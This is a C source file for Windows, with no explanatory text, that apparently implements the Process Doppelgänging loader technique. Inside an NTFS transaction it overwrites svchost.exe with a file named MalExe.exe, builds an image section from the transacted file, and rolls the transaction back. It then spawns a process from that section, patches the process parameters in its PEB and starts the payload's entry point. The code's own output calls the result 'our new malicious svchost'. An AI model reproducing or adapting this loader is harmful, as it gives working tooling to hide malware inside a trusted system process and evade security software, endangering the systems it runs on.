#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <KtmW32.h>
#include <lmerr.h>
#include <winternl.h>
#include <psapi.h>
#include "ntdefs.h"

// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
#pragma comment(lib, "psapi.lib")


void
DisplayErrorText(
	DWORD dwLastError
)
{
	HMODULE hModule = NULL; // default to system source
	LPSTR MessageBuffer;
	DWORD dwBufferLength;

	DWORD dwFormatFlags = FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_IGNORE_INSERTS |
		FORMAT_MESSAGE_FROM_SYSTEM;

	//
	// If dwLastError is in the network range, 
	//  load the message source.
	//

	if (dwLastError >= NERR_BASE && dwLastError <= MAX_NERR) {
		hModule = LoadLibraryEx(
			TEXT("netmsg.dll"),
			NULL,
			LOAD_LIBRARY_AS_DATAFILE
		);

		if (hModule != NULL)
			dwFormatFlags |= FORMAT_MESSAGE_FROM_HMODULE;
	}

	//
	// Call FormatMessage() to allow for message 
	//  text to be acquired from the system 
	//  or from the supplied module handle.
	//

	if (dwBufferLength = FormatMessageA(
		dwFormatFlags,
		hModule, // module to get message from (NULL == system)
		dwLastError,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // default language
		(LPSTR)&MessageBuffer,
		0,
		NULL
	))
	{
		DWORD dwBytesWritten;

		//
		// Output message string on stderr.
		//
		WriteFile(
			GetStdHandle(STD_ERROR_HANDLE),
			MessageBuffer,
			dwBufferLength,
			&dwBytesWritten,
			NULL
		);

		//
		// Free the buffer allocated by the system.
		//
		LocalFree(MessageBuffer);
	}

	//
	// If we loaded a message source, unload it.
	//
	if (hModule != NULL)
		FreeLibrary(hModule);
}

LPVOID GetBaseAddressByName(HANDLE hProcess)
{
	MEMORY_BASIC_INFORMATION    mbi;
	SYSTEM_INFO si;
	LPVOID lpMem;
	/* Get maximum address range from system info */
	GetSystemInfo(&si);
	/* walk process addresses */
	lpMem = 0;
	while (lpMem < si.lpMaximumApplicationAddress) {
		VirtualQueryEx(hProcess, lpMem, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
			
		if (mbi.Type & MEM_IMAGE)
			return mbi.BaseAddress;
		/* increment lpMem to next region of memory */
		lpMem = (LPVOID)((DWORD)mbi.BaseAddress +(DWORD)mbi.RegionSize);
			
	}
	return NULL;
}

int main(void)
{
	LARGE_INTEGER liFileSize;
	DWORD dwFileSize;
	HANDLE hSection;
	HANDLE hNtdll = GetModuleHandle("ntdll.dll");
	if (NULL==hNtdll)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got ntdll.dll at 0x%08x\n", hNtdll);
	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	
	if (NULL == createSection)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateSection at 0x%08p\n", createSection);

	HANDLE hTransaction = CreateTransaction(NULL,0,0,0,0,0,NULL);
	if (INVALID_HANDLE_VALUE == hTransaction)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Created a transaction, handle 0x%x\n", hTransaction);

	HANDLE hTransactedFile = CreateFileTransacted("svchost.exe", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	if (INVALID_HANDLE_VALUE == hTransactedFile)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] CreateFileTransacted on svchost, handle 0x%x\n", hTransactedFile);

	HANDLE hExe = CreateFile("MalExe.exe"
		, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hExe)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] opened malexe.exe, handle 0x%x\n", hExe);

	BOOL err = GetFileSizeEx(hExe, &liFileSize);
	if (FALSE == err)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	dwFileSize = liFileSize.LowPart;
	printf("[+] malexe size is 0x%x\n", dwFileSize);

	BYTE *buffer = malloc(dwFileSize);
	if (NULL == buffer)
	{
		printf("Malloc failed\n");
		return -1;
	}
	printf("[+] allocated 0x%x bytes\n", dwFileSize);

	if (FALSE == ReadFile(hExe, buffer, dwFileSize, NULL, NULL))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] read malexe.exe to buffer\n");

	
	if (FALSE == WriteFile(hTransactedFile, buffer, dwFileSize, NULL, NULL))

	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] over wrote svchost in transcation\n");

	
	NTSTATUS ret = createSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
	if(FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] created a section with our new malicious svchost\n");

	if (FALSE == RollbackTransaction(hTransaction))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] rolling back the original svchost\n");

	NtCreateProcessEx createProcessEx = (NtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
	if (NULL == createProcessEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateProcessEx 0x%08p\n", createProcessEx);

	HANDLE hProcess;
	ret = createProcessEx(&hProcess, GENERIC_ALL, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Created our process, handle 0x%x\n", hProcess);

	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(buffer + dos_header->e_lfanew);
	DWORD oep = ntHeader->OptionalHeader.AddressOfEntryPoint;
	oep+=(DWORD)GetBaseAddressByName(hProcess);
	printf("[+] our new process oep is 0x%08x\n", oep);
	NtCreateThreadEx createThreadEx = (NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (NULL == createThreadEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtCreateThreadEx 0x%08p\n", createThreadEx);

	HANDLE hThread;
	ret= createThreadEx(&hThread, GENERIC_ALL,NULL, hProcess, (LPTHREAD_START_ROUTINE)oep, NULL,TRUE, 0, 0, 0, NULL);	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}	printf("[+] creating thread with oep at %x\n", oep);	my_PRTL_USER_PROCESS_PARAMETERS ProcessParams = 0;
	RtlCreateProcessParametersEx createProcessParametersEx = (RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
	if (NULL == createProcessParametersEx)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got RtlCreateProcessParametersEx 0x%08p\n", createProcessParametersEx);



	WCHAR stringBuffer[] = L"C:\\Windows\\SysWOW64\\svchost.exe";
	UNICODE_STRING  string;


	string.Buffer = stringBuffer;
	string.Length = sizeof(stringBuffer);
	string.MaximumLength = sizeof(stringBuffer);
	ret = createProcessParametersEx(&ProcessParams, &string,NULL,NULL,&string,NULL,NULL,NULL,NULL,NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] creating Process Parameters\n");

	LPVOID RemoteProcessParams;
	RemoteProcessParams = VirtualAllocEx(hProcess, ProcessParams, (DWORD)ProcessParams&0xffff + ProcessParams->EnvironmentSize + ProcessParams->MaximumLength, MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
	if(NULL == RemoteProcessParams)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] creating memory at process for our paramters 0x%08x\n", RemoteProcessParams);

	ret=WriteProcessMemory(hProcess, ProcessParams, ProcessParams, ProcessParams->EnvironmentSize + ProcessParams->MaximumLength,NULL);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] writing our paramters to the process\n");

	my_NtQueryInformationProcess queryInformationProcess = (my_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (NULL == queryInformationProcess)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtQueryInformationProcess 0x%08p\n", queryInformationProcess);

	PROCESS_BASIC_INFORMATION info;

	ret = queryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&info,
		sizeof(info),
		0);

	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}

	PEB *peb = info.PebBaseAddress;

	ret=WriteProcessMemory(hProcess, &peb->ProcessParameters, &ProcessParams, sizeof(LPVOID), NULL);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] writing our paramters to the process peb 0x%08x\n", peb);

	NtResumeThread resumeThread = (NtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
	if (NULL == resumeThread)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] Got NtResumeThread 0x%08p\n", resumeThread);

	WOW64_CONTEXT context;
	context.ContextFlags = CONTEXT_ALL;
	err = Wow64GetThreadContext(hThread, &context);
	if (FALSE == err)
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("eip %x", context.Eip);
	getchar();

	ret = resumeThread(hThread, NULL);
	if (FALSE == NT_SUCCESS(ret))
	{
		DisplayErrorText(GetLastError());
		return -1;
	}
	printf("[+] resumed our thread\n", peb);

	//TerminateProcess(hProcess, 9);
	CloseHandle(hProcess);
	return 0;
}